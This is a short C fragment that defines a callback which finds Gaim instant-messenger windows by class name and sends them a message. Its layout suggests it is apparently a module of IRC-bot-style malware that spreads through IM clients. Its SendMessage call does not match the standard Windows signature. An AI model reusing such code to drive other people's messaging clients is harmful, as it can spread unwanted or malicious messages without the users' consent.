#include "includes.h"

#ifndef NO_GAIM

BOOL CALLBACK Gaim(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "gdkWindowToplevel"))
		iWindow = 1;

	SendMessage(hwnd, iWindow);

    return TRUE;
}
#endif